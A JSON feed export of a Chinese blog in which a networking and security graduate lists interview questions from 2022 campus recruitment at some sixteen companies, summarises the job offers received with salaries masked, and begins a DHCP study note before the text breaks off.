{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2022/10/28/%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E9%A2%98/",
            "url": "http://example.com/2022/10/28/%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E9%A2%98/",
            "title": "秋招面试题",
            "date_published": "2022-10-28T05:38:45.000Z",
            "content_html": "<h1 id=\"秋招面试题\"><a class=\"markdownIt-Anchor\" href=\"#秋招面试题\">#</a> 秋招面试题</h1>\n<h2 id=\"1特斯拉-网络工程师-一面\"><a class=\"markdownIt-Anchor\" href=\"#1特斯拉-网络工程师-一面\">#</a> 1. 特斯拉 - 网络工程师 - 一面</h2>\n<blockquote>\n<p>0. 自我介绍 (不限语言)</p>\n<p>1. 有哪些直辖市</p>\n<p>2. 鲁迅故居</p>\n<p>3. 东三省</p>\n<p>4. 曹操哪个朝代</p>\n<p>5. 唐宋八大家</p>\n<p>6. 苏轼苏洵苏辙 关系</p>\n<p>7. 表格堂哥区别</p>\n<p>6.DHCP 工作原理</p>\n<p>7.DNS port</p>\n<p>8.dhcp 配置时 IP helper-address</p>\n<p>9.Liunx 内核，发行版</p>\n<p>10.mac 地址哪一层</p>\n<p>11. 网管干啥</p>\n<p>12.aws 干啥</p>\n<p>13. 项目和实习时的区别</p>\n<p>14. 能用 python 写一些自动获取 ip 的脚本吗，不是 dhcp，是 SDN 那类</p>\n<p>15.kali 一般用那些工具</p>\n<p>16. 生涯规划 你到底要干安全还是网络<br>\n (面网络别提安全)</p>\n<p>17. 你还有啥想问的</p>\n<p>立即推 ， 当场送走</p>\n<p>一共 22 分钟，两个面试官，先问常识，再问网络，最后实习项目校园经历，一般都是按照简历顺序问的</p>\n</blockquote>\n<h2 id=\"2理想汽车-安全运营-一面\"><a class=\"markdownIt-Anchor\" href=\"#2理想汽车-安全运营-一面\">#</a> 2. 理想汽车 - 安全运营 - 一面</h2>\n<blockquote>\n<p>有啥安全相关的项目或者实习经历<br>\n答：没有，但我干过 CTF</p>\n<p>CTF 那件事情你最印象深刻<br>\n答：php 反序列化<br>\n此处省略 1k 字<br>\n从原理防御 到 pop 链</p>\n<p>既然说到了 pop 链，说说看 php 里面的魔法方法吧</p>\n<p>说到了 wakeup 绕过，这个在 php 某些版本有用，还是通杀<br>\n答：只记得是 cve 漏洞，在 &lt; 7.0 的版本测试过</p>\n<p>逻辑漏洞任意邮箱注册怎么修 指的是激活账号时修改邮箱导致任意邮箱注册，也可以理解为任意邮箱激活<br>\n答：加 token 追问：在哪加，是注册的时候加，还是激活的时候加<br>\n寄</p>\n<p>富文本编辑器 XSS 怎么修</p>\n<p>sql 注入防御</p>\n<p>PDO 在无法限制的场景比如 order by 该怎么办</p>\n<p>以上三道及回答均在胡扯，答案自己百度去吧</p>\n<p>入侵排查 排查哪些 shell 脚本一般要写哪些</p>\n<p>追问 netstat 怎么查看，那么多 ip 那个是危险的<br>\n - lntup grep establish<br>\n 怎么找到进程<br>\n有对应的 PID<br>\n 排查进程启动项…</p>\n<p>渗透的时候印象深刻的事<br>\n横向，向日葵</p>\n<p>discuz 漏洞复现<br>\n任意文件删除 cookie 存注入</p>\n<p>cookie 对单个参数限制长度，如何绕过</p>\n<p>能用 sqlmap 为啥还要自己写脚本</p>\n<p>Python 私有方法 lamdba 表达式 map sum<br>\na[1,2,3,4,5]<br>\na[1::3]<br>\nsum(map(lamdba(x:x+3))) == 13</p>\n<p>数组切片</p>\n<p>对于出现了 0day，该怎么对公司资产进行排查</p>\n<p>全程大概 1 个小时，人都麻了</p>\n</blockquote>\n<h2 id=\"3快手-idc运营网络方向-一面\"><a class=\"markdownIt-Anchor\" href=\"#3快手-idc运营网络方向-一面\">#</a> 3. 快手 - IDC 运营网络方向 - 一面</h2>\n<blockquote>\n<p>我看你写的网络工程，讲讲你的专业课掌握程度<br>\n答：tcpip 会一点，网络编程一般</p>\n<p>专业排名</p>\n<p>tcpip 滑动窗口原理 滑动窗口初始值是多少<br>\n慢启动是啥<br>\n tcpip 多少层，都是啥，每层作用 (参考数据包的封装 解封装)<br>\n tcp syc flood 原理防御<br>\n答：限制连接数和连接时间<br>\n然后用他就反驳了我，这两个办法都有待商榷</p>\n<p>ospf<br>\n 负载分担怎么实现 答：开销<br>\n两台路由器之间取消负载分担，只需要 A-&gt;B 不负载分担，回程不管，在哪配开销，为什么 答：在 A 配，路由表的原因<br>\n那 b 呢，如果不配来回路径不一致会有问题吗</p>\n<p>一个区域中如果网络类型为 p2p 会有几类 LSA</p>\n<p>lsa 类型 只需要说常见的既可以</p>\n<p>ospf 防环 区域间区域内</p>\n<p>spf 算法</p>\n<p>bgp 属性</p>\n<p>origin network 路由和汇总路由都是什么 origin 不同 origin 优先级那个更优 origin 怎么控制选路 答： bgprou -&gt; iprou</p>\n<p>双点双向 重发布</p>\n<p>项目 交换机类型 上下连 端口 收敛比</p>\n<p>全程 35 分钟左右，我又又又裂开了</p>\n</blockquote>\n<h2 id=\"4shareit-sre-一面\"><a class=\"markdownIt-Anchor\" href=\"#4shareit-sre-一面\">#</a> 4.SHAREit - SRE - 一面</h2>\n<blockquote>\n<p>接不接受 7*24oncall</p>\n<p>crontab * 字段含义</p>\n<p>Linux 版本</p>\n<p>http 状态码</p>\n<p>tcp 和 udp 区别</p>\n<p>怎样学习新知识</p>\n<p>k8s 了解</p>\n<p>怎样看文件夹大小 (du)</p>\n<p>分区挂载过程</p>\n<p>mysql 新建用户</p>\n<p>mysql 查看权限</p>\n<p>如果在周末出了 serv2 你第一个看到你怎么做</p>\n<p>使用过公有云吗</p>\n<p>有哪些负载均衡器</p>\n<p>有哪些监控软件</p>\n<p>怎样查看和本机建立了连接的 IP</p>\n<p>怎么判断主机之间是否连通</p>\n<p>怎么样判断主机之间端口是否开放</p>\n<p>用过 python 和 shell 吗，用 python 干了啥，用 shell 干了啥</p>\n</blockquote>\n<h2 id=\"5信锐-技术服务工程师-一面\"><a class=\"markdownIt-Anchor\" href=\"#5信锐-技术服务工程师-一面\">#</a> 5. 信锐 - 技术服务工程师 - 一面</h2>\n<blockquote>\n<p>自我介绍</p>\n<p>实习干啥的</p>\n<p>访问网页过程</p>\n<p>电脑获取地址方法 (讲了手工配和 dhcp, 详细讲了 dhcp)</p>\n<p>接上一题：你说 dhcp 有哪些报文？</p>\n<p>路由协议分类</p>\n<p>讲一种你熟悉的路由协议</p>\n<p>学习方法 (怎样学习新知识)</p>\n<p>网管干啥的 (简历上的，在学校担任过)</p>\n<p>讲了一下在学校 troubleshooting 的思路</p>\n<p>唐都项目干啥的</p>\n<p>讲了一下干了个啥</p>\n<p>生涯规划</p>\n<p>还有啥问题想问的</p>\n</blockquote>\n<h2 id=\"6信锐-技术支持-二面\"><a class=\"markdownIt-Anchor\" href=\"#6信锐-技术支持-二面\">#</a> 6. 信锐 - 技术支持 - 二面</h2>\n<blockquote>\n<p>自我介绍</p>\n<p>网络通信两种模型，区别<br>\n OSI TCP</p>\n<p>怎么保证可靠性和安全性<br>\n冗余 安全</p>\n<p>为什么要考 ie<br>\n 先说了一个技术方面，他说只有技术吗，没有对职业的规划？我后面补充了我是网工的啦，以后想干这行啦，最后也扯回到了职业规划</p>\n<p>ie 证书咋考的，为啥第一次面试没过，我说项目题挂了，他追问有哪些项目题，我说了一个企业网架构，三层架构，他追问每一层是干啥的，用到啥技术</p>\n<p>追着项目往死里问，问我为啥一个项目能做两个月，咋割接的，都 tm 快和他吵起来了，我和他讲是因为配置迁移问题，他死活说有问题</p>\n<p>唐都那个项目干啥了<br>\n简单说了一下排错和优化</p>\n<p>有啥没考过的证书</p>\n<p>过去一年最难的事<br>\n考 ie</p>\n<p>大学中印象最深的事<br>\n奖学金</p>\n<p>生涯规划</p>\n<p>你觉得和别人相比，你的优势是什么<br>\n我说我对于设备更了解一些啦</p>\n<p>有女朋友吗，为什么不找。那你是从来没谈过吗，高中谈过吗<br>\n沉迷学习，日渐消瘦</p>\n<p>如果有个你很喜欢的姑娘，但你父母死活不同意，怎么办<br>\n沟通，然后他就搞了各种各样的</p>\n<p>对技术支持的了解<br>\n对接客户和工程师</p>\n<p>以上两个是对逻辑的考察，评价是整体偏弱，需要考虑客户的痛点</p>\n<p>还有啥问题，我问的除了我说的两条，还有对于技术支持的工作还有什么补充的吗，他说的上面那条逻辑偏差</p>\n</blockquote>\n<h2 id=\"7深信服-安全服务-一面\"><a class=\"markdownIt-Anchor\" href=\"#7深信服-安全服务-一面\">#</a> 7. 深信服 - 安全服务 - 一面</h2>\n<blockquote>\n<p>自我介绍</p>\n<p>三层交换机和二层交换机的区别</p>\n<p>查看用户历史命令 怎么查看别人的历史命令</p>\n<p>文件上传 getshell 了但不能链接怎么排查</p>\n<p>你熟悉那种漏洞<br>\n答：sql 注入</p>\n<p>sql 注入有哪几种</p>\n<p>union select 后面可以跟 union select insert 吗</p>\n<p>union select 叫啥名字</p>\n<p>怎么通过数据库获取系统权限 mysql 呢，SQL server 呢<br>\n答 mysql 可以写 shell<br>\n 估计是想听 mysql 提权</p>\n<p>mysql 写 shell 的命令是啥</p>\n<p>堆叠注入原理</p>\n<p>堆叠注入和 union select 有啥区别</p>\n<p>报错注入原理，语句</p>\n<p>时间盲注原理，语句</p>\n<p>shrio 反序列化，fastjson 反序列化</p>\n<p>struct 漏洞<br>\n答：三个都不会</p>\n<p>讲讲 Java 反序列化</p>\n<p>内网渗透搭隧道怎么搭<br>\n答：可以用 earthworm</p>\n<p>earthworm 三种模式</p>\n<p>还有其他方法吗</p>\n<p>内网横向有哪些方法<br>\n答：ipc wmin psexec</p>\n<p>psexec 忘了问了啥了</p>\n<p>wmin 端口是啥，横向之后是什么权限</p>\n<p>权限维持有哪几种</p>\n<p>有安全项目和实习嘛</p>\n<p>怎么学习</p>\n<p>职业规划</p>\n<p>机构的课程结束了嘛</p>\n<p>有你印象的技术类博客嘛</p>\n</blockquote>\n<h2 id=\"8安天-网络安全管培生一面\"><a class=\"markdownIt-Anchor\" href=\"#8安天-网络安全管培生一面\">#</a> 8. 安天 - 网络安全管培生一面</h2>\n<blockquote>\n<p>我的自我介绍</p>\n<p>对于安全的理解</p>\n<p>学校主修的除了网安还有啥</p>\n<p>项目有啥和安全相关的</p>\n<p>实习有啥和安全相关的</p>\n<p>登录框有啥漏洞</p>\n<p>入侵排查</p>\n<p>讲讲你学的，举个例子<br>\n异或取反 beef</p>\n<p>有很多项目同时给你你咋办</p>\n<p>我们在沈阳北京哈尔滨都有站点，但沈阳是小站点，你怎么规划，如果你 base 沈阳</p>\n<p>如果你带领五个人的团队你怎么管理</p>\n<p>你又要干技术又要管理你怎么办</p>\n<p>网管碰到棘手的人咋办</p>\n<p>这哥们第一年招管培生和我谈论今天穿了什么</p>\n<p>你对于职业规划</p>\n<p>上一个来的是个 985 博士，已经研究员了</p>\n</blockquote>\n<p>9. 长亭 - 技术支持 - 一面</p>\n<blockquote>\n<p>自我介绍</p>\n<p>印象深刻项目<br>\n说了说割接</p>\n<p>然后问的挺详细</p>\n<p>实习经历</p>\n<p>说说看交换机 troubleshooting</p>\n<p>说说看服务器 troubleshooting</p>\n<p>有部署会操作系统吗<br>\n没有他们都是 pxe</p>\n<p>ce 和 ie 啥时候考的</p>\n<p>我看你网络的，说说 osi 每层协议</p>\n<p>osi 封装解封装</p>\n<p>tcp 四次挥手 timewait</p>\n<p>为啥握手三次挥手四次</p>\n<p>http 有哪几个版本，区别是啥</p>\n<p>https 原理<br>\n http 有哪些组成<br>\n头 行</p>\n<p>拿 linux 搭过什么服务<br>\n搭过网站</p>\n<p>哪些网站，怎么搭的</p>\n<p>nigix 搭过吗，讲讲特性</p>\n<p>nginx 有哪些负载分担模式</p>\n<p>邮件搭过吗 dns 搭过吗</p>\n<p>dns 原理是啥<br>\n我不知道于是我开始扯 log4j2 dnslog 外带</p>\n<p>我看你安全很懂哦，说说看 xss<br>\n 命名空间混淆突变，dom 破坏</p>\n<p>waf 是干啥的，那一层的</p>\n<p>类似于生涯规划的问题</p>\n<p>说说看你对长亭的理解</p>\n<p>说说看你对岗位的理解</p>\n<p>工作地点</p>\n<p>Q&amp;A</p>\n</blockquote>\n<h2 id=\"10宏杉-技术支持-一面\"><a class=\"markdownIt-Anchor\" href=\"#10宏杉-技术支持-一面\">#</a> 10. 宏杉 - 技术支持 - 一面</h2>\n<blockquote>\n<p>自我介绍</p>\n<p>考研吗考公吗</p>\n<p>大学啥专业，为啥投这个岗位</p>\n<p>证书自己花钱还是父母的钱</p>\n<p>ie 多少钱</p>\n<p>为啥考</p>\n<p>六级多少分四级多少分</p>\n<p>籍贯</p>\n<p>面试通过多久过来实习</p>\n<p>路由协议有哪些</p>\n<p>生成树作用</p>\n<p>super vlan</p>\n<p>dhcp</p>\n<p>链路聚合协议哪几种优缺点</p>\n<p>linux 启动过程</p>\n<p>定时任务</p>\n<p>全国分配可以接受？</p>\n<p>明年过年结束后可以过来</p>\n<p>家里干啥的</p>\n<p>兄弟姐妹几个</p>\n<p>期望薪资</p>\n</blockquote>\n<h2 id=\"11中科曙光-云平台网络研发工程师-一面\"><a class=\"markdownIt-Anchor\" href=\"#11中科曙光-云平台网络研发工程师-一面\">#</a> 11. 中科曙光 - 云平台网络研发工程师 - 一面</h2>\n<blockquote>\n<p>1.OSI 二层和三层有哪些协议</p>\n<p>2. 用过防火墙吗，有哪些功能，怎么保证安全，内部实现</p>\n<p>3.VPN 用过吗，IPSEC 详细原理了解过吗</p>\n<p>4.DHCP 报文交互过程，重启虚拟机发什么包</p>\n<p>5. 服务器端口没有 up</p>\n<p>6. 交换机端口没有 up</p>\n<p>7. 链路捆绑，两个端口 LACP 断了一边</p>\n<p>8. 开发接触过吗，python 作过哪些项目</p>\n<p>9. 毕业论文</p>\n<p>10. 啥时候实习</p>\n</blockquote>\n<h2 id=\"12汉德-云解决方案工程师-一面\"><a class=\"markdownIt-Anchor\" href=\"#12汉德-云解决方案工程师-一面\">#</a> 12. 汉德 - 云解决方案工程师 - 一面</h2>\n<blockquote>\n<p>0x00<br>\n 这家是秋招面了四五十家技术含量最高的企业，没有之一，问的太广了，问的还很深，扛不住扛不住，告辞</p>\n<p>linux<br>\n1.linux 进程状态<br>\n 3 running, 144 sleeping, 0 stopped, 1 zombie</p>\n<p>2. 检查服务是否运行</p>\n<p>3. 查看服务器 CPU，内存，磁盘利用率，linux 版本<br>\n内存：<br>\n[lighthouse@VM-16-11-centos ~]$ free<br>\ntotal used free shared buff/cache available<br>\nMem: 1881996 577340 112936 17348 1191720 1091156<br>\nSwap: 1049596 524544 525052<br>\n/proc/meminfo 内存<br>\n vmstat 内存<br>\n top 命令一般用于查看进程的 CPU 和内存使用情况<br>\n df -h lsblk fdisk -l 硬盘</p>\n<p>4.crontab<br>\n5. 常用 linux 命令<br>\n 6. 更改文件权限 chmod</p>\n<p>网络<br>\n 1.tcp 和 udp 区别<br>\n 2.get 和 post 区别<br>\n 3. 访问 www.xxx.com 发生了什么<br>\n 4.cookie 和 session 区别<br>\n 5. 状态码</p>\n<p>安全<br>\n 1.sql 注入，防御<br>\n 2. 安全工具<br>\n 3. 靶场<br>\n 4. 有哪些加密算法</p>\n<p>mysql<br>\n1.acid<br>\n2.mysql 锁<br>\n 3. 隔离界别<br>\n 4. 主键，外键，主键和索引区别</p>\n<p>操作系统<br>\n死锁<br>\n预防死锁<br>\n内存泄漏</p>\n<p>项目<br>\n实习</p>\n<p>比赛经历</p>\n<p>猜数字<br>\n四个数字不重复<br>\n 3456 1A 1B A 代表位置数字正确 B 代表只有数字正确</p>\n</blockquote>\n<h2 id=\"13宏杉-技术支持-二面\"><a class=\"markdownIt-Anchor\" href=\"#13宏杉-技术支持-二面\">#</a> 13. 宏杉 - 技术支持 - 二面</h2>\n<blockquote>\n<p>DRBDR</p>\n<p>LVM 磁盘满了，用另一块磁盘扩容的命令</p>\n<p>工作地点</p>\n<p>你的你的同事做一个项目，因为同事的原因失败了，领导批评了你，你怎么办</p>\n<p>领导给你一个你不会做的比较难的任务，你怎么办</p>\n<p>生涯规划，啥时候来实习</p>\n</blockquote>\n<h2 id=\"14中科闻歌-运维工程师-一面\"><a class=\"markdownIt-Anchor\" href=\"#14中科闻歌-运维工程师-一面\">#</a> 14. 中科闻歌 - 运维工程师 - 一面</h2>\n<blockquote>\n<p>OSI 模型</p>\n<p>STP 选举</p>\n<p>防火墙用过吗，啥型号的，A 访问 B 时在防火墙配置单向还是双向，如果是交换机，需要配置单向还是双向</p>\n<p>BGP 选路</p>\n<p>OSPF 邻居建立</p>\n<p>项目</p>\n</blockquote>\n<h2 id=\"15吉利英伦-网络管理专员-一面\"><a class=\"markdownIt-Anchor\" href=\"#15吉利英伦-网络管理专员-一面\">#</a> 15. 吉利英伦 - 网络管理专员 - 一面</h2>\n<blockquote>\n<p>200-300 人的小型网怎么做<br>\n 200-300 人的小型网怎么做<br>\n我说三层，他说只有接入和核心</p>\n<p>链路选择，光还是电，都用在什么场景，传输距离</p>\n<p>有哪些 vpn<br>\n 他说现在都是硬件的，ipsec</p>\n<p>lvm 是啥</p>\n<p>iaas paas saas</p>\n<p>链路可靠性 (聚合</p>\n<p>堆叠，假如五台做堆叠，有一台有上联，怎么搞，堆叠需要啥<br>\n需要堆叠线缆</p>\n<p>怎么控制访问，比如不让访问 qq</p>\n<p>有哪些 cs 的服务，我说 web，他追问中间件有哪些， nginx 干啥的，有啥功能，咋做负载分担<br>\n我说服务器集群，他说还得有数据库集群和其他集群</p>\n<p>怎么样通过域名访问服务器<br>\n我说内网搭个 dns，他说这样只有内网，我又说买个域名设置 ip 解析，他没说啥</p>\n<p>防火墙在出口，怎么保证可靠，还有上网行为管理可靠</p>\n<p>网关在核心，vlan 怎么划分</p>\n<p>上网行为管理放哪，哪种模式</p>\n</blockquote>\n<h2 id=\"16迪普-技术支持-一面\"><a class=\"markdownIt-Anchor\" href=\"#16迪普-技术支持-一面\">#</a> 16. 迪普 - 技术支持 - 一面</h2>\n<blockquote>\n<p>IPSEC 了解过吗</p>\n<p>三层转发源目 IP 源目 MAC 变吗</p>\n<p>BGP 邻居建立</p>\n<p>BGP 传递路由，撤销路由</p>\n<p>bgp refresh import export</p>\n<p>ospf 卡在 exstart 状态原因</p>\n<p>ospf 影响邻居建立因素</p>\n<p>p2mp 和 p2p 能建邻居吗</p>\n<p>linux 压缩解压缩</p>\n<p>tar 命令每个参数含义</p>\n<p>scp 了解过吗</p>\n<p>防火墙转发机制</p>\n<p>防火墙有哪些安全域，dmz 优先级多少</p>\n<p>防火墙区域内互访通吗，区域间呢</p>\n<p>防火墙对于多通道协议支持</p>\n<p>防火墙多通道协议对于 nat 支持</p>\n<p>sql 注入原因与防御</p>\n<p>上网行为管理不通怎么排查   查日志</p>\n<p>割接失败怎么办</p>\n<p>你怎么割接的</p>\n<p>你的优势是什么</p>\n</blockquote>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/10/27/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/",
            "url": "http://example.com/2022/10/27/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/",
            "title": "秋招总结",
            "date_published": "2022-10-27T05:38:45.000Z",
            "content_html": "<h1 id=\"秋招总结\"><a class=\"markdownIt-Anchor\" href=\"#秋招总结\">#</a> 秋招总结</h1>\n<h2 id=\"0x00-废话~\"><a class=\"markdownIt-Anchor\" href=\"#0x00-废话~\">#</a> 0x00 废话～</h2>\n<p>秋招从七月份投的第一家特斯拉开始，到目前 (2022.10.15)，已经投了快 170 家了，有安全，网络，运维岗，我只能投这三个岗，因为我也只会这三个。我常因为自己太菜与你们格格不入～。目前 offer 有四家。</p>\n<blockquote>\n<p>1. 信锐 (技术支持)</p>\n<p>通过三面拿到的 offer，一面基本技术面，二面半技术半问答 (文章接下来的问答指的均是聊天，比如有女朋友吗，对技服了解吗这类非技术相关的问题)，三面纯问答聊天。最终想薪资也是目前到现在最高的，年薪可以达到 20</p>\n<p>2. 兴唐通信 (系统集成)</p>\n<p>这是一家国企，带有一些保密性质，因此入职三年之内不能离职，这可能是我最不能接受的点，因为子曾经曰过:“安全人，安全魂，安全人都是人上人”，我的计划是今年经济形势不好先随便找个给的多的企业苟着，来年再战，混到安全去！因此我拒绝了这家的 offer。第二个原因就是给的是在有点少，虽然 base 在上海，我立即推当场回家，但上海不到 1W (具体多少也不能透露，反正没有 1W，大概 ***)，着实有些难受，而且他的风评也有些诡异，告辞，惹不起～。补充一句，这家也有三面，好像三面都没怎么问技术</p>\n<p>3. 中海达 (技术支持)</p>\n<p>这是一家鸽王<sub>，第一批面试的时候鸽了我 20 分钟，当时还在实习，是在是等不起，于是到了第二批。第二批又鸽了我二十分钟，上午的面试，中午才给我打电话，说改到下午五点，五点又迟到 8 分钟</sub>大无语事件。但那天一面面完第二天还是第三天直接发 offer 了。offer 上面没写薪资没写待遇福利，实在难以下咽，遂告辞。更新 1.0:offer 是九月底发的，但十月中旬突然又来和我探讨薪资的事，您这个跨度有些大啊～，而且给的和兴唐差不多，难顶 (薪资水平 *** 左右)</p>\n<p>4. 保融科技 (技术支持)</p>\n<p>这家公司只有二面，两次面试都没咋问技术，但聊得很开心，是秋招目前为止聊得最开心的公司，一面的小姐姐也很好看<sub>好评</sub>，但无奈薪资问题和预期差距过大，毕竟第一个信锐 offer 拿到后，后面面的给的都没信锐多，厂商规模也没信锐大，这家 base 在杭州，但我的 offer 是实施，就是全国出差的那种，那其实和信锐没啥区别了，两家做的东西都相同的情况下，肯定是找大厂和工资高的，保融啊<sub>我对不起你啊</sub> (2,3,4 这三家其实薪资都差不多)(记一下吧反正不发出去，这个基本薪资 ***，也有烂七八糟的补贴)<br>\n 10.20 补充</p>\n<p>今天又拿了两家 offer，再来废话两句</p>\n<p>5. 宏杉科技 (技术支持)</p>\n<p>这是个存储的公司，在全国大部分城市都有办事处，工作地点也和信锐一样，结合自己的意愿和公司实际情况分配。这家是目前为止除了信锐给的第一多的，一个月基本工资能有 ***，还有乱七八糟的房补，和其他补贴。但他不讲武德的地方在于，如果你把它违约了你需要支付违约金，但如果你因为他把别人违约了他是一分不给。(学学信锐，哪有这么白嫖的)，而且常住地，户籍所在地是没有房补的。没有必要，拒了。面试一共两次，第一次问了点技术，第二次也问了点，但比第一次少很多，第二次多了很多职场题目。</p>\n<p>6. 东方日升 (运维工程师)</p>\n<p>这家应该是做经济的，我投的好像是啥技术类管培生，他的 offer 上是这么写的，我也不记得我投了啥了。这家一共只有一面，是 hr 和一个问技术的一起面的，但技术没问啥，全问的项目实习，这种回答了几千遍的题目是在没意思，我全程输出，他根本插不上嘴，我一堆 span-leaf，border-leaf 把它杀穿。然后第二天就给 offer 了，问题在于实习 ***，转正 xxx。难顶啊～拒了拒了</p>\n<p>10.21 补充，又拿了一家 offer 再来 bb 两句 ，说实话，每次拿到 offer 都把我搞的精疲力尽</p>\n<p>7. 中科闻歌 (运维工程师)</p>\n<p>这家是面到现在最心动的一家公司，面试只有一面，但三个面试官，第一个问网络，第二个问项目，第三个 hr 随便问点，但他们给人一种很重视应届毕业生的感觉，也可能是错觉，而且这家公司规模其实能比信锐更大一些，我投的是做运维的，据他们说他们公司会让网络和搞云计算的一起工作，达成一些目的。但无奈薪资实在尴尬，北京 ***，没有房补，我真的要露宿街头了，当场贷款上班，告辞，最不巧的是给信锐寄方法和给中科翁工决定是同一天的同一个下午，但凡他有个房补，我当场违约。</p>\n<p>10.25 补充，这是昨天还是前天的 offer 了</p>\n<p>8. 石化盈科 (网络安全工程师)</p>\n<p>非常奇葩的面试，只有一面，但一面包车的面试官，一个腾讯会议进去十几个人，每个人都应该是部门的经理一类的，然后 hr 是先和你进行讨论的人，讲到哪个技术部门负责人感兴趣会对你进行追问，比如当时有个部门应该是搞渗透测试的，还有个应该是搞二进制的。这个 offer 也很奇葩，hr 告诉部门经理 offer 已经给我了，让他来找我沟通，结果我没有收到 offer，听这个人一顿讲，最后不知道薪资多少。最后还是他帮我问的，一个月 ***，还是包含房补的，工作地点在北六环附近，那边租房也得 2k-3k，抢钱啊～，但听那人最后的意思是找我去做数据中心运维…</p>\n<p>10.27 更新，203 家…</p>\n<p>我发的时候把薪资屏蔽了，如果想知道具体的可以找我私聊～</p>\n</blockquote>\n<p>再废话两句，1. 有能投的就投，千万别看大小，举个栗子，谁都没想到今年最高的是个没听过名字的机器人公司，你认为的小厂不一定是小厂，一般有机构看机构的就业群，没有找公众号，公众号的企业虽然多，但不是所有企业都要我这种 IT 的，秋招群里的信息实际上是老师们过滤之后的，有针对性了很多</p>\n<p>2. 笔试和测评可能很多很多，但还是要好好做的，万一呢～</p>\n<p>3. 考研，考研，考研，重要的事情说八百遍，今天面试的哥们问我你有 ie 为啥不去华为，我:…，华为是不会要双非的本科的，考研最好也往 211 考。</p>\n<p>4. 最好对自己投的企业做个详细记录，同时对面试过程也做个详细记录，方便后续复盘，我今天的复盘的全部内容来自于我每次面完写的 CSDN，最好每次面完就复盘，这样对你下一家类似岗位的很有帮助，人不能在一个地方疯狂翻车</p>\n<p>5. 不要死磕运维 / 安全岗，有给的多的，差不多能干的就先跑，不雅等春招，某个企业的 HR 在和我聊得时候透露等春招他们就剩个位数岗位或者直接不招了，而且春招还要再加几百万研究生们，难度直接上天</p>\n<p>总结到这，废话说完了，开始正题，预计文章会有两大部分。 <code>1.网络岗，技术支持岗，运维岗面试总结</code>     <code>2.安全岗面试总结</code></p>\n<p>项目实习啥的就不说了问的基本上都一样，还有一些你遇到的困难，印象深刻的事啦，随缘临场发挥吧</p>\n<p>安全岗包括但不限于安服，网络安全管培生等职位，和安全相关的都在下面列举</p>\n<h2 id=\"0x01-网络技术支持运维岗总结\"><a class=\"markdownIt-Anchor\" href=\"#0x01-网络技术支持运维岗总结\">#</a> 0x01 网络，技术支持，运维岗总结</h2>\n<h3 id=\"1dhcp工作原理报文种类\"><a class=\"markdownIt-Anchor\" href=\"#1dhcp工作原理报文种类\">#</a> 1.DHCP 工作原理，报文种类</h3>\n<p><code>出现厂家：特斯拉一面(ip helper address)，信锐(获取地址方法，问的其实还是这个)，中科曙光，宏杉</code></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221016184839806.png\" alt=\"image-20221016184839806\" style=\"zoom: 67%;\" />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.四次交互获取IP</span><br><span class=\"line\">广播发送discover报文，寻找DHCP服务器</span><br><span class=\"line\">offer单播回，其中包含着一个ip地址和一些配置信息比如，网关，租期，dns等</span><br><span class=\"line\">广播发送request请求这个IP地址，发广播的原因可能网络中还有其他的DHCP服务器，告诉他们自己有了IP地址</span><br><span class=\"line\">dhcp服务器收到a的request之后单播发送一个ACK,此地址才可以开始使用</span><br><span class=\"line\"></span><br><span class=\"line\">2.租期，续约</span><br><span class=\"line\">当租期到达50%会单播发送request包，服务器收到单播回复ack，主机租期刷新</span><br><span class=\"line\">在租期到达85%会广播发送request包，网络上任何一台DHCP服务器都可以应答ack或者nak，收到ACK刷新租期，收到NAK重新申请IP</span><br><span class=\"line\">当租期到达100%会发送release报文，释放IP地址，之后重新discover申请地址</span><br><span class=\"line\">即可以通过request刷新租期，release释放地址</span><br><span class=\"line\"></span><br><span class=\"line\">3.DHCP是UDP的，使用67(server),68(client)</span><br><span class=\"line\"></span><br><span class=\"line\">4.dhcp一共八种报文，剩下四种</span><br><span class=\"line\">NAK：服务器拒绝请求</span><br><span class=\"line\">release：释放IP地址</span><br><span class=\"line\">infrom：向服务端请求一些信息</span><br><span class=\"line\">decline：地址冲突时，告知服务器禁止使用此地址</span><br><span class=\"line\"></span><br><span class=\"line\">5.一些协议细节~</span><br><span class=\"line\">1.如果该客户端上次也问服务端要过地址，那么客户端在检查该地址没有被分配有还是会分配给这个客户端(所以说dhcp是C/S的)</span><br><span class=\"line\">2.客户端发的discover含有request ip，服务端检查地址是否可用，如果可用，还是会分给客户端此地址</span><br><span class=\"line\">3.客户端发的discover不含request ip，服务端从地址池上找一个最小的可用IP分配</span><br><span class=\"line\">4.NAK的情况：请求的静态IP，MAC无法与之对应。ack中验证失败</span><br><span class=\"line\"></span><br><span class=\"line\">6.DHCP offer中有租期是华为特有,其他厂商是使用inform报文</span><br><span class=\"line\">最好看看不同厂商对于DHCP的支持</span><br></pre></td></tr></table></figure>\n<h3 id=\"3tcpudp相关\"><a class=\"markdownIt-Anchor\" href=\"#3tcpudp相关\">#</a> 3.TCP/UDP 相关</h3>\n<h4 id=\"tcp滑动窗口初始值慢启动流控快手\"><a class=\"markdownIt-Anchor\" href=\"#tcp滑动窗口初始值慢启动流控快手\">#</a> tcp 滑动窗口初始值，慢启动，流控 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span 